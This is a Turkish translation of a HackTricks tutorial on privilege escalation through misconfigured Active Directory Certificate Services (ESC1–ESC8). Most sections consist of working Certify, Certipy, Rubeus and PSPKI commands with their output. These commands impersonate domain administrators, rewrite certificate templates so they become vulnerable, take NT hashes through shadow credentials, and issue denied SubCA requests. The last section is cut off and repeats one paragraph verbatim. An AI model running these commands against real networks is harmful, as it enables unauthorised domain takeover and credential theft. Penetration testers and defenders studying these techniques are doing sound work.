# AD CS Domain Yükseltme

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

**Bu, yükseltme tekniklerinin özetidir:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Sertifika Şablonları - ESC1

### Açıklama

### Yanlış Yapılandırılmış Sertifika Şablonları - ESC1 Açıklaması

* **Düşük ayrıcalıklı kullanıcılara Kurumsal CA tarafından kayıt hakları verilir.**
* **Yönetici onayı gerekmez.**
* **Yetkili personelin imzaları gerekmez.**
* **Sertifika şablonlarının güvenlik tanımlayıcıları aşırı derecede izin vericidir, bu da düşük ayrıcalıklı kullanıcıların kayıt haklarını elde etmesine olanak tanır.**
* **Sertifika şablonları, kimlik doğrulamayı kolaylaştıran EKU'ları tanımlamak için yapılandırılmıştır:**
* Genişletilmiş Anahtar Kullanımı (EKU) tanımlayıcıları, Müşteri Kimlik Doğrulama (OID 1.3.6.1.5.5.7.3.2), PKINIT Müşteri Kimlik Doğrulama (1.3.6.1.5.2.3.4), Akıllı Kart Oturumu (OID 1.3.6.1.4.1.311.20.2.2), Herhangi Bir Amaç (OID 2.5.29.37.0) veya EKU olmadığı (AltCA) dahil edilir.
* **Sertifika İmzalama İsteği'nde (CSR) talep sahiplerinin subjectAltName eklemesine izin verilir:**
* Etkin Dizin (AD), varsa kimlik doğrulama için bir sertifikada subjectAltName (SAN) önceliği verir. Bu, bir CSR'da SAN'ı belirterek herhangi bir kullanıcıyı (örneğin, bir etki alanı yöneticisi) taklit etmek için bir sertifika talep edilebileceği anlamına gelir. Talep sahibinin SAN belirtebilmesi, sertifika şablonunun AD nesnesindeki `mspki-certificate-name-flag` özelliği aracılığıyla belirtilir. Bu özellik bir bit maskesidir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının varlığı, talep sahibinin SAN'ı belirtebilmesine izin verir.

{% hint style="danger" %}
Belirtilen yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile sertifika talep etmelerine izin verir, bu da Kerberos veya SChannel aracılığıyla herhangi bir etki alanı temsilcisi olarak kimlik doğrulamasını sağlar.
{% endhint %}

Bu özellik bazen ürünler veya dağıtım hizmetleri tarafından HTTPS veya ana bilgisayar sertifikalarının anlık olarak oluşturulmasını desteklemek için etkinleştirilir veya anlayış eksikliğinden kaynaklanır.

Bu seçeneğin etkinleştirilmesiyle bir sertifika oluşturmanın bir uyarıyı tetiklediği, mevcut bir sertifika şablonunun (örneğin, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` şablonu) çoğaltıldığı ve ardından bir kimlik doğrulama OID'si içerecek şekilde değiştirildiği durumda bu durumun geçerli olmadığı belirtilmiştir.

### Kötüye Kullanım

**Zararlı sertifika şablonlarını bulmak** için şunu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Bu zafiyeti kullanarak bir yöneticiyi taklit etmek için şunu çalıştırabilirsiniz:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Ardından oluşturulan **sertifikayı `.pfx`** formatına dönüştürebilir ve tekrar Rubeus veya certipy kullanarak **kimlik doğrulama yapabilirsiniz**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe", PFX'i oluşturmak için kullanılabilir: [https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee](https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee)

AD Ormanının yapılandırma şeması içindeki sertifika şablonlarının numaralandırılması, onay veya imza gerektirmeyen, Müşteri Kimlik Doğrulama veya Akıllı Kart Oturumu EKU'ya sahip ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkin olanlar için aşağıdaki LDAP sorgusunu çalıştırarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Sertifika Şablonları - ESC2

### Açıklama

İkinci kötüye kullanım senaryosu, birincisiyle benzerlik gösterir:

1. Kurumsal CA tarafından düşük ayrıcalıklı kullanıcılara kayıt hakları verilir.
2. Yönetici onayı gerekliliği devre dışı bırakılır.
3. Yetkili imzaların gerekliliği atlanır.
4. Sertifika şablonunda aşırı izin verici bir güvenlik tanımlayıcısı, düşük ayrıcalıklı kullanıcılara sertifika kayıt hakları verir.
5. **Sertifika şablonu, Herhangi Amaçlı EKU'yu veya hiçbir EKU'yu içerecek şekilde tanımlanır.**

**Herhangi Amaçlı EKU**, bir saldırganın müşteri kimlik doğrulama, sunucu kimlik doğrulama, kod imzalama vb. dahil olmak üzere **herhangi bir amaç** için sertifika elde etmesine izin verir. Bu senaryoyu istismar etmek için **ESC3 için kullanılan teknik** aynı şekilde kullanılabilir.

**EKU'su olmayan** alt CA sertifikaları olarak hareket eden sertifikalar, **herhangi bir amaç** için istismar edilebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle, bir saldırgan, bir alt CA sertifikası kullanarak yeni sertifikalarda keyfi EKU'lar veya alanlar belirtebilir.

Ancak, **etki alanı kimlik doğrulaması** için oluşturulan yeni sertifikalar, **`NTAuthCertificates`** nesnesi tarafından güvenilmeyen alt CA tarafından desteklenmiyorsa çalışmayacaktır, bu varsayılan ayar. Bununla birlikte, bir saldırgan hala **herhangi bir EKU** ve keyfi sertifika değerleriyle yeni sertifikalar oluşturabilir. Bunlar potansiyel olarak **kod imzalama, sunucu kimlik doğrulama vb.** gibi çeşitli amaçlar için **kötüye kullanılabilir** ve SAML, AD FS veya IPSec gibi ağdaki diğer uygulamalar için önemli sonuçları olabilir.

Bu senaryoya uyan şablonları AD Ormanı'nın yapılandırma şemasında sıralamak için aşağıdaki LDAP sorgusu çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Kayıt Ajanı Şablonları - ESC3

### Açıklama

Bu senaryo, birincisi ve ikincisi gibi bir **farklı EKU** (Sertifika İstek Ajanı) ve **2 farklı şablonu** (bu nedenle 2 farklı gereksinim setine sahip) **kötüye kullanarak** gerçekleşir.

Microsoft belgelerinde **Enrollment Agent** olarak bilinen **Sertifika İstek Ajanı EKU** (OID 1.3.6.1.4.1.311.20.2.1), bir başka kullanıcı adına bir sertifika için bir başka kullanıcı adına **kaydolma** yetkisi verir.

**"kayıt ajanı"**, bu tür bir bir **şablona kaydolur** ve sonuçta oluşan **sertifikayı diğer kullanıcının adına bir CSR'yi ortak imzalamak için kullanır**. Ardından, **ortak imzalı CSR'yi** CA'ya gönderir, "başkası adına kaydol" izin veren bir **şablona kaydolur** ve CA, "diğer" kullanıcıya ait bir **sertifika ile yanıt verir**.

**Gereksinimler 1:**

- Kurumsal CA, düşük ayrıcalıklı kullanıcılara kayıt yetkisi verir.
- Yönetici onayı gereksinimi atlanır.
- Yetkilendirilmiş imzalar için gereksinim yoktur.
- Sertifika şablonunun güvenlik tanımlayıcısı aşırı derecede izin vericidir ve düşük ayrıcalıklı kullanıcılara kayıt yetkisi verir.
- Sertifika şablonu, Sertifika İstek Ajanı EKU'sunu içerir ve diğer başlıklar adına diğer sertifika şablonlarının isteğini etkinleştirir.

**Gereksinimler 2:**

- Kurumsal CA, düşük ayrıcalıklı kullanıcılara kayıt yetkisi verir.
- Yönetici onayı atlanır.
- Şablonun şema sürümü 1 veya 2'den büyüktür ve Sertifika İstek Ajanı EKU'sunu gerektiren bir Uygulama Politikası İhraç Gereksinimi belirtir.
- Sertifika şablonunda tanımlanan bir EKU, etki alanı kimlik doğrulamasına izin verir.
- Kayıt ajanları için kısıtlamalar CA üzerinde uygulanmaz.

### Kötüye Kullanım

Bu senaryoyu kötüye kullanmak için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz.
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Kullanıcılar**, **bir kayıt ajanı sertifikası** almasına izin verilen, kayıt **ajanlarının** kayıt yapmasına izin verilen şablonlar ve kayıt ajanının adına hareket edebileceği **hesaplar** kurumsal CA'lar tarafından sınırlanabilir. Bunun için `certsrc.msc` **eklentisini** açarak, CA üzerinde **sağ tıklayarak**, **Özellikler'i tıklayarak** ve ardından "Kayıt Ajanları" sekmesine **gezinerek** yapılır.

Ancak, CA'ların **varsayılan** ayarı "Kayıt ajanlarını sınırlama" şeklinde değildir. Yöneticiler tarafından kayıt ajanları üzerindeki kısıtlama etkinleştirildiğinde, "Kayıt ajanlarını sınırla" olarak ayarlandığında, varsayılan yapılandırma son derece izin vericidir. Herkese herhangi bir şablona herhangi biri olarak kaydolma izni verir.

## Zayıf Sertifika Şablonu Erişim Kontrolü - ESC4

### **Açıklama**

**Sertifika şablonlarındaki** **güvenlik tanımlayıcısı**, şablona ilişkin **AD öznelerinin** sahip olduğu **izinleri** belirler.

Bir **saldırgan**, bir **şablonu** **değiştirmek** ve **önceki bölümlerde** belirtilen **sömürülebilir yanlış yapılandırmaları** uygulamak için gerekli **izinlere** sahipse, ayrıcalık yükseltme kolaylaştırılabilir.

Sertifika şablonlarına uygulanabilen dikkate değer izinler şunları içerir:

- **Sahip:** Nesne üzerindeki denetimi sağlar, herhangi bir özelliği değiştirmeyi mümkün kılar.
- **FullControl:** Nesne üzerinde tam yetki sağlar, herhangi bir özelliği değiştirmeyi içerir.
- **WriteOwner:** Nesnenin sahibini saldırganın kontrolü altındaki bir özneye değiştirmeye izin verir.
- **WriteDacl:** Erişim kontrollerini ayarlamaya izin verir, saldırganın FullControl yetkisi verme potansiyeline sahip olabilir.
- **WriteProperty:** Herhangi bir nesne özelliğini düzenlemeyi yetkilendirir.

### Kötüye Kullanım

Önceki gibi bir ayrıcalık yükseltme örneği:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir sertifika şablonu üzerinde yazma yetkisine sahip olması durumudur. Örneğin, bu, şablonun yapılandırmasını üzerine yazarak şablonu ESC1 için savunmasız hale getirmek için kötüye kullanılabilir.

Yukarıdaki yolculukta sadece `JOHNPC` bu yetkilere sahip, ancak kullanıcımız `JOHN` yeni `AddKeyCredentialLink` kenarını `JOHNPC`'ye sahip. Bu teknik sertifikalarla ilgili olduğu için, bu saldırıyı da uyguladım, bu da [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinir. İşte Certipy'nin `shadow auto` komutunun kurbanın NT hash'ini almak için küçük bir örneği.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, tek bir komutla bir sertifika şablonunun yapılandırmasını üzerine yazabilir. **Varsayılan olarak**, Certipy, yapılandırmayı **ESC1'e karşı savunmasız hale getirmek için üzerine yazar**. Ayrıca, **eski yapılandırmayı kaydetmek için `-save-old` parametresini belirtebiliriz**, bu saldırımızdan sonra yapılandırmayı **geri yüklemek için** faydalı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Zayıf PKI Nesne Erişim Kontrolü - ESC5

### Açıklama

Sertifika şablonları ve sertifika yetkilisi dışında birçok nesneyi içeren karmaşık ACL tabanlı ilişkiler ağı, AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilen bu nesneler şunları içerir:

* CA sunucusunun AD bilgisayar nesnesi, S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla tehlikeye atılabilir.
* CA sunucusunun RPC/DCOM sunucusu.
* Belirli konteyner yolunda (`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`) yer alan herhangi bir alt nesne veya konteyner. Bu yol, Sertifika Şablonları konteyneri, Sertifika Yetkilileri konteyneri, NTAuthCertificates nesnesi ve Enrollment Services Konteyneri gibi konteynerler ve nesneleri içerir, ancak bunlarla sınırlı değildir.

PKI sisteminin güvenliği, düşük ayrıcalıklı bir saldırganın bu kritik bileşenlerden herhangi birini ele geçirmesi durumunda tehlikeye atılabilir.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) tartışılan konu, Microsoft tarafından belirtilen **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerine de değinmektedir. Bu yapılandırma, bir Sertifika Yetkilisi (CA) üzerinde etkinleştirildiğinde, Active Directory® tarafından oluşturulan talepler de dahil olmak üzere **herhangi bir talepte** **kullanıcı tanımlı değerlerin** **alternatif isim** içermesine izin verir. Sonuç olarak, bu düzenleme, standart Kullanıcı şablonu gibi **ayrıcalıksız** kullanıcı kaydı için açık olan **herhangi bir şablonda** kaydolmasına izin verir. Bu durumda, bir sertifika alınabilir ve saldırganın etki alanında bir etki alanı yöneticisi veya **herhangi bir etkin varlık** olarak kimlik doğrulaması yapmasına olanak tanır.

**Not**: Sertifika İmzalama İsteği'ne (CSR) **alternatif isimlerin** eklenmesi için `certreq.exe`'de `-attrib "SAN:"` argümanı aracılığıyla ("Ad Değer Çiftleri" olarak adlandırılan) bir yaklaşım, ESC1'deki SAN'ların sömürü stratejisinden farklılık gösterir. Buradaki fark, hesap bilgilerinin bir uzantı yerine bir sertifika özniteliği içinde nasıl kapsüllendiğinde yatar.

### Kötüye Kullanım

Bu ayarın etkinleştirilip etkinleştirilmediğini doğrulamak için kuruluşlar aşağıdaki komutu `certutil.exe` ile kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem temel olarak **uzaktan kayıt defteri erişimi** kullanır, bu nedenle alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Bu tür bir yanlış yapılandırmayı tespit etmek ve istismar etmek için **Certify** ve **Certipy** gibi araçlar kullanılabilir: 

[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy)
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, varsayılan olarak **etki alanı yönetici** haklarına veya buna eşdeğer haklara sahip olduğunu varsayarak, aşağıdaki komut herhangi bir çalışma istasyonundan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızdan devre dışı bırakmak için bayrak kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Mayıs 2022 güvenlik güncellemelerinden sonra, yeni verilen **sertifikalar**, talep edenin `objectSid` özelliğini içeren bir **güvenlik uzantısı** içerecektir. ESC1 için bu SID, belirtilen SAN'dan türetilir. Ancak, **ESC6** için SID, SAN değil talep edenin `objectSid`'ini yansıtır.\
ESC6'yı sömürmek için, sistemin **ESC10'a (Zayıf Sertifika Eşlemeleri) duyarlı olması** önemlidir, bu da yeni güvenlik uzantısını SAN'dan öncelikli tutar.
{% endhint %}

## Zayıf Sertifika Yetkilisi Erişim Kontrolü - ESC7

### Saldırı 1

#### Açıklama

Bir sertifika yetkilisinin erişim kontrolü, CA işlemlerini düzenleyen bir dizi izinle sağlanır. Bu izinler, `certsrv.msc`'ye erişerek, bir CA'yı sağ tıklayarak, özellikleri seçerek ve ardından Güvenlik sekmesine giderek görüntülenebilir. Ayrıca, izinler PSPKI modülü kullanılarak aşağıdaki gibi komutlarla sıralanabilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, "CA yöneticisi" ve "Sertifika Yöneticisi" rollerine karşılık gelen temel haklar olan **`ManageCA`** ve **`ManageCertificates`** hakları hakkında bilgi sağlar.

#### Kötüye Kullanım

Bir sertifika yetkilisine **`ManageCA`** hakları vermek, PSPKI kullanarak uzaktan ayarları manipüle etmelerine olanak tanır. Bu, herhangi bir şablonda SAN belirtmeye izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağını açma işlemini içerir, bu da etki alanı yükseltmesinin kritik bir yönüdür.

Bu sürecin basitleştirilmesi, PSPKI'nin **Enable-PolicyModuleFlag** cmdlet'inin kullanımıyla doğrudan GUI etkileşimi olmadan değişiklik yapılmasını sağlar.

**ManageCertificates** haklarına sahip olmak, bekleyen isteklerin onaylanmasını kolaylaştırır ve "CA sertifika yöneticisi onayı" güvenliğini etkisiz hale getirir.

**Certify** ve **PSPKI** modüllerinin bir kombinasyonu, bir sertifika talep etmek, onaylamak ve indirmek için kullanılabilir:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Saldırı 2

#### Açıklama

{% hint style="warning" %}
Önceki saldırıda, **`Yönet CA`** izinleri kullanılarak **EDITF\_ATTRIBUTESUBJECTALTNAME2** bayrağının etkinleştirilmesiyle **ESC6 saldırısı** gerçekleştirildi, ancak bu, CA hizmeti (`CertSvc`) yeniden başlatılmadıkça herhangi bir etkiye sahip olmayacaktır. Bir kullanıcıya **Yönet CA** erişim hakkı verildiğinde, kullanıcının aynı zamanda **hizmeti yeniden başlatma** izni de vardır. Bununla birlikte, kullanıcının hizmeti uzaktan yeniden başlatabileceği anlamına gelmez. Ayrıca, **Mayıs 2022 güvenlik güncellemeleri** nedeniyle, ESC6'nın çoğu yamalı ortamda çalışmayabileceği unutulmamalıdır.
{% endhint %}

Bu nedenle, burada başka bir saldırı sunulmaktadır.

Önkoşullar:

* Sadece **`ManageCA` izni**
* **`Manage Certificates`** izni (ManageCA'dan verilebilir)
* Sertifika şablonu **`SubCA`** etkin olmalıdır (ManageCA'dan etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika talepleri** verebileceği gerçeğine dayanır. **`SubCA`** sertifika şablonu **ESC1'e** karşı savunmasızdır, ancak **yalnızca yöneticiler** şablona kaydolabilir. Bu nedenle, bir **kullanıcı**, **`SubCA`'ya kaydolma** talebinde bulunabilir - bu talep **reddedilecektir** - ancak **ardından yönetici tarafından verilecektir**.

#### Kötüye Kullanım

Kullanıcıyı yeni bir yetkili olarak ekleyerek, **kendinize `Manage Certificates`** erişim hakkını **verebilirsiniz**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** şablonu, `-enable-template` parametresiyle CA üzerinde **etkinleştirilebilir**. Varsayılan olarak, `SubCA` şablonu etkin durumdadır.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Eğer bu saldırı için gereksinimleri karşıladıysak, **`SubCA` şablonuna dayalı bir sertifika talep ederek** başlayabiliriz.

Bu talep **reddedilecek**, ancak özel anahtarı kaydedecek ve talep kimliğini not edeceğiz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` ve `Manage Certificates`** ile **başarısız olan sertifika** talebini `ca` komutu ve `-issue-request <talep ID>` parametresiyle **oluşturabiliriz**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve son olarak, `req` komutu ve `-retrieve <request ID>` parametresi ile **verilen sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## AD CS HTTP Uç Noktalarına NTLM İletimi - ESC8

### Açıklama

{% hint style="info" %}
**AD CS yüklü** ortamlarda, **savunmasız bir web kaydı uç noktası** varsa ve **en az bir sertifika şablonu yayınlanmışsa** (varsayılan **`Machine`** şablonu gibi), **spooler servisi etkin olan herhangi bir bilgisayarın saldırgan tarafından ele geçirilmesi mümkün olur**!
{% endhint %}

AD CS tarafından desteklenen birkaç **HTTP tabanlı kayıt yöntemi**, yöneticilerin kurabileceği ek sunucu rolleri aracılığıyla kullanılabilir hale getirilmiştir. Bu HTTP tabanlı sertifika kaydı arabirimleri, **NTLM iletim saldırılarına** karşı savunmasızdır. Bir saldırgan, **ele geçirilmiş bir makineden, gelen NTLM kimlik doğrulaması yapan herhangi bir AD hesabını taklit edebilir**. Kurban hesabını taklit ederken, saldırgan bu web arabirimlerine erişebilir ve `User` veya `Machine` sertifika şablonlarını kullanarak bir istemci kimlik doğrulama sertifikası talep edebilir.

* **Web kayıt arabirimi** (bir önceki ASP uygulaması, `http://<casunucusu>/certsrv/` adresinde mevcuttur), yalnızca HTTP'yi varsayılan olarak kullanır ve NTLM iletim saldırılarına karşı koruma sağlamaz. Ayrıca, yetkilendirme HTTP başlığı aracılığıyla yalnızca NTLM kimlik doğrulamasına izin verir ve Kerberos gibi daha güvenli kimlik doğrulama yöntemlerini kullanmayı engeller.
* **Sertifika Kayıt Hizmeti** (CES), **Sertifika Kayıt Politikası** (CEP) Web Hizmeti ve **Ağ Cihazı Kayıt Hizmeti** (NDES) varsayılan olarak yetkilendirme için müzakere kimlik doğrulamasını destekler. Müzakere kimlik doğrulaması, hem Kerberos hem de **NTLM'yi** destekler ve saldırganın iletim saldırıları sırasında NTLM'ye **geri düşmesine** izin verir. Bu web hizmetleri varsayılan olarak HTTPS'yi etkinleştirir, ancak HTTPS yalnız başına **NTLM iletim saldırılarına karşı koruma sağlamaz**. HTTPS hizmetlerinin NTLM iletim saldırılarına karşı korunması, HTTPS'in kanal bağlamayla birleştirilmesiyle mümkündür. Ne yazık ki, AD CS, kanal bağlaması için gereken IIS üzerindeki Genişletilmiş Kimlik Doğrulama Korumasını etkinleştirmez.

NTLM iletim saldırılarının yaygın bir **sorunu**, NTLM oturumlarının **kısa süreli olması** ve saldırganın **NTLM imzalama gerektiren hizmetlerle etkileşime girememesi**dir.

Bununla birlikte, bu kısıtlama, bir NTLM iletim saldırısını kullanarak kullanıcı için bir sertifika elde etmek suretiyle aşılmaktadır, çünkü sertifikanın geçerlilik süresi oturum süresini belirler ve sertifika, **NTLM imzalama zorunlu olan hizmetlerle kullanılabilir**. Çalınan bir sertifikayı kullanma talimatları için şu adrese bakın:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM iletim saldırılarının başka bir kısıtlaması, **saldırgan tarafından kontrol edilen bir makinenin bir kurban hesabı tarafından kimlik doğrulanması gerektiğidir**. Saldırgan bu kimlik doğrulamasını bekleyebilir veya **zorlayabilir**:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Kötüye Kullanım**

[**Certify**](https://github.com/GhostPack/Certify)'nin `cas` komutu, **etkin HTTP AD CS uç noktalarını** sıralar:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Sertifika Yetkilileri (CAs) tarafından Sertifika Kayıt Hizmeti (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar, **Certutil.exe** aracı kullanılarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Certify ile Kötüye Kullanım

Bu yöntem, bir hedefin Active Directory ortamında sertifikaları kötüye kullanarak ayrıcalıkları yükseltmeyi hedefler. Sertifikalar, kimlik doğrulama ve yetkilendirme için kullanılan önemli bileşenlerdir. Sertifikalar, bir kullanıcının veya bir bilgisayarın kimliğini doğrulamak ve güvenli bir şekilde iletişim kurmak için kullanılır.

Bu saldırı yöntemi, bir hedefin Active Directory ortamında sertifikaları kötüye kullanarak ayrıcalıkları yükseltmeyi hedefler. Sertifikalar, kimlik doğrulama ve yetkilendirme için kullanılan önemli bileşenlerdir. Sertifikalar, bir kullanıcının veya bir bilgisayarın kimliğini doğrulamak ve güvenli bir şekilde iletişim kurmak için kullanılır.

